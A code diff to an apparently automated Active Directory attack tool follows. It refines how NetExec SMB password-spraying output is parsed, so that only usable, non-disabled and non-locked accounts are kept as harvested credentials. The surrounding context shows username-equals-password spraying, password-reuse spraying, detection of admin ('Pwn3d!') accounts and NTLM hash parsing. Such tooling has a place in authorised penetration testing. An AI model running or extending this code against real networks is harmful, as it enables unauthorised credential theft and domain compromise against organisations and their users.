@@ -26,6 +26,25 @@ from .tools.runner import which
 # ---- output parsers ---------------------------------------------------------
 _USER_RE = re.compile(r"\\([^\s\\]+)\s+\(SidTypeUser\)")
 _HIT_RE = re.compile(r"\[\+\]\s+(\S+?)\\([^:\s]+):(\S*)")          # dom\user:pass
+# NetExec still prints a "[+]" for accounts it can bind but that are unusable —
+# disabled/locked/expired/must-change — so those are NOT real credentials.
+_BAD_STATUS = ("STATUS_ACCOUNT_DISABLED", "STATUS_ACCOUNT_RESTRICTION",
+               "STATUS_ACCOUNT_LOCKED_OUT", "STATUS_ACCOUNT_EXPIRED",
+               "STATUS_PASSWORD_EXPIRED", "STATUS_PASSWORD_MUST_CHANGE",
+               "STATUS_LOGON_FAILURE")
+
+
+def _valid_hits(text: str):
+    """(domain, user, pass) tuples from real SMB successes — a '[+]' line with no
+    disqualifying account status."""
+    out = []
+    for line in (text or "").splitlines():
+        if "[+]" not in line or any(b in line for b in _BAD_STATUS):
+            continue
+        m = _HIT_RE.search(line)
+        if m:
+            out.append(m.groups())
+    return out
 _PWN_RE = re.compile(r"\\([^:\s]+):\S+\s+\(Pwn3d!\)")              # admin account
 _NTLM_RE = re.compile(r"^([^:\s]+):\d+:[a-f0-9]{32}:([a-f0-9]{32}):::", re.M)
 _SHARE_RE = re.compile(r"^SMB\s+\S+\s+\d+\s+\S+\s+(\S+)\s+READ", re.M)
@@ -196,9 +215,10 @@ class AdChain:
                     break
 
     def _auth_ok(self, user: str, pw: str) -> bool:
-        res = self.run("netexec_smb", target=self.target, username=user,
-                       password=pw, domain=self.domain)
-        return "[+]" in _ru(res)
+        out = _ru(self.run("netexec_smb", target=self.target, username=user,
+                           password=pw, domain=self.domain))
+        # real success only: a "[+]" with no disabled/locked/restriction status.
+        return "[+]" in out and not any(b in out for b in _BAD_STATUS)
 
     # 2) batch spray username == password (parallel, no lockout) ------------
     def _step_spray_userpass(self) -> None:
@@ -343,7 +363,7 @@ class AdChain:
         hits = []
         for lf in logs:
             if lf.exists():
-                hits += _HIT_RE.findall(lf.read_text(errors="ignore"))
+                hits += _valid_hits(lf.read_text(errors="ignore"))
         return hits
 
     def _spray_single_password(self, password: str):
@@ -362,7 +382,7 @@ class AdChain:
                            timeout=1200)
         except Exception:
             return
-        for dom, user, pw in _HIT_RE.findall(lf.read_text(errors="ignore")):
+        for dom, user, pw in _valid_hits(lf.read_text(errors="ignore")):
             if user.lower() != "guest":
                 self._add_cred(user, password, note="password reuse")
 
